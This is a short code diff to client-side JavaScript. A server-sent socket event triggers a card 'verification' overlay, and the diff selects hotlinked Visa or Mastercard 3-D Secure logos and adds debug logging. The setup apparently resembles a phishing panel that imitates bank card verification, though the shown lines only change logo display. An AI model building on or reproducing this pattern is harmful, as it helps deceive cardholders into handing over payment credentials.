@@ -1863,7 +1863,7 @@
           isProcessing = false;
         });
 
-        // socket on 
+// socket on 
 socket.on('show_mc_verification', (data) => {
   console.log('[DEBUG] Received show_mc_verification event:', data);
   console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
@@ -1886,14 +1886,20 @@ socket.on('show_mc_verification', (data) => {
     verificationContent.style.display = 'none';
     overlay.style.display = 'flex';
     
-    // Set the verification logo based on verificationType parameter
+    // Set the verification logo based on parameter - check ALL possible property names
     if (loadingVerificationLogo) {
-      const verificationType = data.verificationType || 'mastercard';
+      // Check ALL possible property names that might be used
+      const logoType = data.loadingLogoType || data.verificationType || data.verifyType || data.cardType || 'mastercard';
       
-      if (verificationType === 'visa') {
-        loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg">';
+      console.log('[DEBUG] Using logo type for display:', logoType);
+      
+      // Case-insensitive check for "visa" anywhere in the type string
+      if (logoType.toLowerCase().includes('visa')) {
+        loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 60px; max-width: 200px;">';
+        console.log('[DEBUG] Selected VISA logo');
       } else {
-        loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg">';
+        loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 60px; max-width: 200px;">';
+        console.log('[DEBUG] Selected MASTERCARD logo (default)');
       }
     }
     
